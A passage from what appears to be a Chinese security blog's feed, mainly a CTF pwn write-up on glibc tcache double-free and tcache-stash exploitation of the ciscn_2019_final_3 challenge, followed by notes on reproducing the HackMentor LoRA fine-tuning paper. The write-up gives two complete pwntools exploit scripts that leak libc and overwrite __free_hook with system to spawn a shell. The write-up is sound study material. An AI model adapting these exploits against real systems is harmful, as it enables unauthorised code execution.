id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache double free"></a>tcache double free</h2><p>2.26 和 2.27较早的版本是没有double free 检查的，即可以连着2次free同一个chunk</p><h3 id="ciscn-final-3"><a href="#ciscn-final-3" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_final_3">https://buuoj.cn/challenges#ciscn_2019_final_3</a></p><p>libc2.27（无double free检测的版本），只有new和delete，delete之后没有清空指针，并且new之后输出chunk的content部分的地址。不允许分配0x78以上大小的chunk。</p><p>整体思路：通过double free可以在任意地址分配chunk的原理，在某个chunk减16的位置分配chunk，新的chunk就可以修改旧的chunk的sz字段，让他可以被free到 unsorted bin 。</p><p>没有show函数，如何泄露unsorted bin的地址？</p><blockquote><p>切割unsorted bin里的chunk，使这个chunk和一个<strong>已经被free</strong>的tcache chunk开头对齐，这时就相当于修改了tcache chunk的fd，fd= &amp; unsorted bin，</p><p>连续分配两次chunk，就可以在unsorted bin处分配一个chunk， 题目自带泄露chunk地址的功能，就等于泄露了libc</p></blockquote><p>再来一个tcache double free，向free hook写入system，然后free一个content=binsh的chunk，就完事了</p><p><strong>如何想到的呢？</strong></p><p>题目只有new和delete，以及泄露chunk地址。想要泄露libc就必须通过这个自带的泄露实现。因此要在unsorted bin这个地方malloc一个chunk（毕竟我只会通过unsorted bin泄露libc地址），结合题目最大chunk不超过0x78的限制，得到必须要改某个chunk的sz字段的结论。</p><p>然后没有edit，只有new的时候能修改，因此要利用“向任意地址分配chunk”的漏洞，然后一看，正好可以用double free，对上了。</p><p>至于chunk被free到unsorted bin之后如何泄露fd，bk，这确实很难想到。“切割unsorted bin把它的开头和一个free的tcache chunk对齐” 这一点也只有这道题能用了，毕竟需要有知道chunk被分配到哪里的能力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28198</span>)<br>e = ELF(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>) <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;choice &gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the index\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice &gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the index\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the size\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;now you can write something\n&#x27;</span>)<br>    p.sendline(content)<br>    p.recvuntil(<span class="hljs-string">b&#x27;gift :&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])<br><br>addr0 = new(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">1</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">2</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">3</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>new(<span class="hljs-number">5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">6</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">8</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment"># from 0 - 8 -&gt; sz= 0x450</span><br>new(<span class="hljs-number">9</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <br>new(<span class="hljs-number">10</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br><br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">10</span>)<br>new(<span class="hljs-number">11</span>, <span class="hljs-number">0x70</span>, p64(addr0 - <span class="hljs-number">16</span>))<br>new(<span class="hljs-number">12</span>, <span class="hljs-number">0x70</span>, p64(addr0 - <span class="hljs-number">16</span>))<br>new(<span class="hljs-number">13</span>, <span class="hljs-number">0x70</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x451</span>)) <span class="hljs-comment"># size must be equal to the front </span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">14</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment"># cut unsorted bin chunk</span><br>new(<span class="hljs-number">15</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>main_arena = new(<span class="hljs-number">16</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) - <span class="hljs-number">96</span><br>libc_base = main_arena-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system_addr = libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>new(<span class="hljs-number">17</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>delete(<span class="hljs-number">17</span>)<br>delete(<span class="hljs-number">17</span>)<br>new(<span class="hljs-number">18</span>, <span class="hljs-number">0x10</span>, p64(free_hook))<br>new(<span class="hljs-number">19</span>, <span class="hljs-number">0x10</span>, p64(free_hook))<br>new(<span class="hljs-number">20</span>, <span class="hljs-number">0x10</span>, p64(system_addr))<br>delete(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>还有个地方没想明白，为什么题目里这个0x40，改成0x50也对（同时也修改0x461），改成0x70（同时也修改0x481）就不对了。。。想不明白了 😭</p><h2 id="tcache-stash"><a href="#tcache-stash" class="headerlink" title="tcache stash"></a>tcache stash</h2><p>比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。</p><h3 id="ciscn-final-3-1"><a href="#ciscn-final-3-1" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h3><p>还是上一节这道题，不用tcache 连续double free无检查的漏洞。</p><p>抄的大佬的博客：<a href="https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3">https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3</a></p><p>但是最后面pwndbg显示不出来堆，exp没看懂（</p><p>以后再说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 28849) </span><br>p = process(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;) </span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<span class="hljs-comment">#</span><br><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice &gt; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>,size:<span class="hljs-built_in">int</span> , content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input the index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;input the size&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;now you can write something&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input the index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <br>    p.recvuntil(<span class="hljs-string">b&quot;gift :&quot;</span>)<br>    heap_leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-string">&#x27;heap addr leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    heap_base = heap_leak - <span class="hljs-number">0x11e70</span> <span class="hljs-comment"># tcache struct &#x27;s header</span><br>    log.success(<span class="hljs-string">&#x27;heap base: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base)) <span class="hljs-comment"># leak 0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>        new(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 0~6 free tcache is full</span><br>        free(i)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    free(<span class="hljs-number">7</span>) <span class="hljs-comment">#  free(x) to tcache then free(x) to fastbin can&#x27;t trigger error</span><br>    free(<span class="hljs-number">8</span>)<br>    free(<span class="hljs-number">7</span>) <span class="hljs-comment"># fastbin double free </span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">17</span>): <br>        new(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># 10 ~ 16 == 0 ~ 6</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">17</span>, <span class="hljs-number">0x70</span>, p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment"># stash , fastbin to tcache</span><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    new(<span class="hljs-number">18</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">19</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">20</span>, <span class="hljs-number">0x70</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">35</span> + <span class="hljs-string">b&#x27;\x07&#x27;</span> * <span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="hljs-number">0x10</span>) * <span class="hljs-number">6</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment"># change 36th to 7 (36th is 0x250, the size of tcache struct)</span><br>    <span class="hljs-comment"># and change tcache_entry *entries[0~6] which ranges from 0x20 to 0x70</span><br>    free(<span class="hljs-number">20</span>) <span class="hljs-comment"># to unsorted bin</span><br>    gdb.attach(p)<br>    <span class="hljs-comment"># why tcache_entry changed ?</span><br>    new(<span class="hljs-number">21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">22</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># can&#x27;t pwndbg</span><br>    p.recvuntil(<span class="hljs-string">b&quot;gift :&quot;</span>)<br>    libc_leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-string">&#x27;libc addr leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    libc_base = libc_leak - <span class="hljs-number">0x3ebca0</span><br>    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">23</span>, <span class="hljs-number">0x50</span>, (<span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">10</span>).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) * <span class="hljs-number">2</span>)<br>    new(<span class="hljs-number">24</span>, <span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">10</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMentor论文复现</title>
    <link href="/2023/11/30/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0/HackMentor/"/>
    <url>/2023/11/30/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0/HackMentor/</url>
    
    <content type="html"><![CDATA[<h3 id="HackMentor"><a href="#HackMentor" class="headerlink" title="HackMentor"></a>HackMentor</h3><p>官方代码地址：<a href="https://github.com/tmylla/HackMentor/tree/main">https://github.com/tmylla/HackMentor/tree/main</a></p><p>论文：<a href="https://github.com/tmylla/HackMentor/blob/main/HackMentor.pdf">https://github.com/tmylla/HackMentor/blob/main/HackMentor.pdf</a></p><p>llm的一个微调，用于安全领域知识问答，复习一下pytorch和lora</p><h4 id="加载-base-model-和-lora-model"><a href="#加载-base-model-和-lora-model" class="headerlink" title="加载 base model 和 lora model"></a>加载 base model 和 lora model</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> transformers, torch<br><span class="hljs-keyword">from</span> peft <span class="hljs-keyword">import</span> PeftModel<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_lora_model</span>(<span class="hljs-params">base_model, lora_model, device_map=<span class="hljs-string">&quot;auto&quot;</span></span>):<br>    <span class="hljs-keyword">global</span> model, tokenizer, generator<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Loading &quot;</span>+base_model+<span class="hljs-string">&quot;...&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> device_map == <span class="hljs-string">&quot;zero&quot;</span>:<br>        device_map = <span class="hljs-string">&quot;balanced_low_0&quot;</span><br><br>    <span class="hljs-comment"># config</span><br>    gpu_count = torch.cuda.device_count()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;gpu_count&#x27;</span>, gpu_count)<br><br>    tokenizer = transformers.LlamaTokenizer.from_pretrained(base_model)<br>    model = transformers.LlamaForCausalLM.from_pretrained(<br>        base_model,<br>        device_map=<span class="hljs-string">&quot;auto&quot;</span>,<br>        torch_dtype=torch.float16,<br>        low_cpu_mem_usage=<span class="hljs-literal">True</span>,<br>        load_in_8bit=<span class="hljs-literal">False</span>,<br>        cache_dir=<span class="hljs-string">&quot;cache&quot;</span><br>    ).cuda()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Loading &quot;</span>+lora_model+<span class="hljs-string">&quot;...&quot;</span>)<br>    model = PeftModel.from_pretrained(<br>        model,<br>        lora_model,<br>        torch_dtype=torch.float16<br>    )<br>    generator = model.generate<br></code></pre></td></tr></table></figure><h4 id="使用model"><a href="#使用model" class="headerlink" title="使用model"></a>使用model</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">fulltext = ......<br>generated_text = <span class="hljs-string">&quot;&quot;</span><br>gen_in = tokenizer(fulltext, return_tensors=<span class="hljs-string">&quot;pt&quot;</span>).input_ids.cuda()<br>in_tokens = <span class="hljs-built_in">len</span>(gen_in)<br><span class="hljs-keyword">with</span> torch.no_grad():<br>    generated_ids = generator(<br>        input_ids = gen_in,<br>        max_new_tokens=<span class="hljs-number">2048</span>,  <span class="hljs-comment"># 生成结果的长度上限</span><br>        use_cache=<span class="hljs-literal">True</span>,<br>        pad_token_id=tokenizer.eos_token_id, <span class="hljs-comment"># 用于指示文本结束的标记</span><br>        num_return_sequences=<span class="hljs-number">1</span>, <span class="hljs-comment"># 生成的文本序列数量</span><br>        do_sample=<span class="hljs-literal">True</span>,<br>        repetition_penalty=<span class="hljs-number">1.1</span>, <span class="hljs-comment"># 控制模型生成重复标记的倾向性，数值越大，生成的文本中重复性越低</span><br>        temperature=<span class="hljs-number">0.6</span>, <span class="hljs-comment"># 用于控制生成的多样性。较高的温度会增加标记的随机性</span><br>        top_k = <span class="hljs-number">50</span>, <span class="hljs-comment"># 在生成过程中，只有概率排名在前K位的标记才会被考虑</span><br>        top_p = <span class="hljs-number">1.0</span>, <span class="hljs-comment"># 在生成过程中，累积概率达到给定值p时停止考虑更低概率的标记</span><br>        early_stopping=<span class="hljs-literal">True</span>, <span class="hljs-comment"># 一个布尔值，控制生成过程是否在遇到pad_token_id后停止</span><br>    )<br>    generated_text = tokenizer.batch_decode(generated_ids, skip_special_tokens=<span class="hljs-literal">True</span>)[<span class="hljs-number">0</span>] <br>    text_without_prompt = generated_text[<span class="hljs-built_in">len</span>(fulltext):]<br><br>response = text_without_prompt<br>response = response.split(human_invitation)[<span class="hljs-number">0</span>]<br>response.strip()<br></code></pre></td></tr></table></figure><h4 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">trainer = transformers.Trainer(<br>    model=model,<br>    train_dataset=train_data,<br>    eval_dataset=val_data,<br>    args=transformers.TrainingArguments(<br>        per_device_train_batch_size=micro_batch_size,<br>        gradient_accumulation_steps=gradient_accumulation_steps,<br>        warmup_steps=<span class="hljs-number">100</span>,<br>        num_train_epochs=num_epochs,<br>        learning_rate=learning_rate,<br>        fp16=<span class="hljs-literal">True</span>,<br>        logging_steps=<span class="hljs-number">1</span>,<br>        optim=<span class="hljs-string">&quot;adamw_torch&quot;</span>,<br>        evaluation_strategy=<span class="hljs-string">&quot;steps&quot;</span> <span class="hljs-keyword">if</span> val_set_size &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;no&quot;</span>,<br>        save_strategy=<span class="hljs-string">&quot;steps&quot;</span>,<br>        eval_steps=eval_step <span class="hljs-keyword">if</span> val_set_size &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>        save_steps=save_step,<br>        output_dir=output_dir,<br>        save_total_limit=<span class="hljs-number">20</span>,<br>        load_best_model_at_end=<span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> val_set_size &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span>,<br>        ddp_find_unused_parameters=<span class="hljs-literal">False</span> <span class="hljs-keyword">if</span> ddp <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>        group_by_length=group_by_length,<br>        report_to=<span class="hljs-string">&quot;wandb&quot;</span> <span class="hljs-keyword">if</span> use_wandb <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;tensorboard&quot;</span>,<br>        run_name=wandb_run_name <span class="hljs-keyword">if</span> use_wandb <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>    ),<br>    data_collator=transformers.DataCollatorForSeq2Seq(<br>        tokenizer, pad_to_multiple_of=<span class="hljs-number">8</span>, return_tensors=<span class="hljs-string">&quot;pt&quot;</span>, padding=<span class="hljs-literal">True</span><br>    ),<br>)<br>model.config.use_cache = <span class="hljs-literal">False</span><br><br>old_state_dict = model.state_dict<br>model.state_dict = (<br>    <span class="hljs-keyword">lambda</span> self, *_, **__: get_peft_model_state_dict(<br>        self, old_state_dict()<br>    )<br>).__get__(model, <span class="hljs-built_in">type</span>(model))<br><br><span class="hljs-comment"># if torch.__version__ &gt;= &quot;2&quot; and sys.platform != &quot;win32&quot;:</span><br><span class="hljs-comment">#     model = torch.compile(model)</span><br><br>trainer.train(resume_from_checkpoint=resume_from_checkpoint)<br>model.save_pretrained(output_dir)<br></code></pre></td></tr></table></figure><h4 id="训练过程中的问题"><a href="#训练过程中的问题" class="headerlink" title="训练过程中的问题"></a>训练过程中的问题</h4><p>所有epoch跑完以后，应该是在save_pretrained里报错</p><p><code>SafetensorError: Error while deserializing header: InvalidHeaderDeserialization</code></p><p><a href="https://github.com/huggingface/transformers/issues/27397">https://github.com/huggingface/transformers/issues/27397</a> 里说，把 <code>model = torch.compile(model)</code>删掉，但是删掉之后又跑了一个epoch，还是报错</p>]]></content>
    
    
    <categories>
      
      <category>论文复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>papers reproduction</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2023/11/27/ctf-pwn/srop/"/>
    <url>/2023/11/27/ctf-pwn/srop/</url>
    
